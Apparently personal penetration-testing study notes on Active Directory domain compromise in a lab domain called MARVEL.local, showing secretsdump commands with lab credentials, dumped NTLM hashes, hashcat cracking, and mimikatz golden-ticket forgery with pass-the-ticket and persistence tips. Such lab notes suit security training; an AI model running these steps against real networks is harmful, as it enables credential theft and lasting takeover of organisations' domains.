## Domain Compromise
Dump NTDS.dit and crack passwords  
Enumerate shares for sensitive info  
### Persistence 
What happens if our DA access is lost?  
Creating a DA account can be useful  (don't forget to delete it)  
Creating a golden ticket can be useful to  

### secretsdump
`secretsdump.py MARVEL.local/tstark:'Password12345'@192.168.176.121 -just-dc-ntlm`  : Dump NTDS, DA required  #secretsdump 

```shell
└─$ secretsdump.py MARVEL.local/tstark:'Password12345'@192.168.176.121 -just-dc-ntlm
Administrator:500:aad3b435b51404eeaad3b435b51404ee:884e12e26b49c8c6ea2643d5db6153e7:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:dc14462826adfb96de12ccd993c32abf:::
MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:9bff06fe611486579fb74037890fda96:::
MARVEL.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
```

 First hash is LM, Second part is NTLM  
 Can copy and paste to excel with ":" delimiter, OR :   
```shell
cat ntdsdit.txt| cut -d ":" -f 4 > hashes.txt`   
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt    
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt   --show  
```

Put cracked hashes on a separate excel sheet
On main sheet with hashes and user name, create formula in new CELL for Vlookup
=vlookup ( 
    - click hash value, 
    - type comma, 
    then select entire sectino/table array from other sheet
    - , 2, false
    =VLOOKUP(C1,Sheet2!A:B,2,FALSE)
Once complete, to remove formatting and keep data.
Copy column, right click, paste special, as values

### Golden Ticket
krbtgt account compromise  #golden
Need krbtgt NT LM Hash
Need domain SID  
PTT after getting golden ticket  #mimikatz 
mimikatz#  kerberos::golden /User:Administrator /domain:MARVEL.local /sid: /krbtgt:  /id:500 /ptt

```shell
mimikatz# privilege::debug
mimikatz# lsadump:: /inject /name:krbtgt

<< Output from the lsadump>>
User : krbtgt
Domain : MARVEL / S-1-5-21-242252404-3644089184-204408389
NTLM : dc14462826adfb96de12ccd993c32abf

mimikatz # kerberos::golden /User:AdministratorFakeFAKE /domain:MARVEL.local /sid:S-1-5-21-242252404-3644089184-204408389 /krbtgt:dc14462826adfb96de12ccd993c32abf /id:500 /ptt
User      : AdministratorFakeFAKE
Domain    : MARVEL.local (MARVEL)
SID       : S-1-5-21-242252404-3644089184-204408389
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: dc14462826adfb96de12ccd993c32abf - rc4_hmac_nt
Lifetime  : 11/10/2024 5:53:17 AM ; 11/8/2034 5:53:17 AM ; 11/8/2034 5:53:17 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'AdministratorFakeFAKE @ MARVEL.local' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6F8BBB7F0

## do something like psexec.exe \\THEPUNISHER cmd.exe 
```

